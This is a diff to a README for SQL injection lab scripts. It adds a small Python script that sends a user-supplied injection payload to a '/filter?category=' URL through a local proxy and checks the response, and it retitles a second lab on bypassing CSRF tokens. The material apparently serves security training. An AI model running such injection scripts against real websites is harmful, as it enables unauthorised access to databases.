@@ -14,10 +14,33 @@ This repository contains Python scripts for various SQL injection labs I am work
 
 python3 script.py <url> <payload>
 
-sql_injection1.py
+import requests
+import sys 
+import urllib
+
+proxies={'http':"http://127.0.0.1:8080",'https':"https://127.0.0.1:8080"}
+
+def exploit_sql(url,payload):
+    uri="/filter?category="
+    r=requests.get(url+uri+payload,verify=False,proxies=proxies)
+    if "cat grin" in r.text:
+        return True
+    else:
+        return False
+
+if __name__ == "__main__":
+    try:
+        url=sys.argv[1].strip() 
+        payload=sys.argv[2].strip()
+    except IndexError:
+        print("usage is not correct ")
+    if exploit_sql(url,payload):
+        print(" the sql injection is complete")
+    else:
+        print("there is error in the sql injection") 
 ```
 
-## Lab 2: Basic SQL Injection
+## Lab 2: SQL Injection with CSRF Token
 
 - **Description**: This lab demonstrates SQL injection while handling CSRF tokens. It retrieves the CSRF token from the webpage and uses it to attempt a login with an SQL payload.
 - **Script**: `sql_injection2.py`
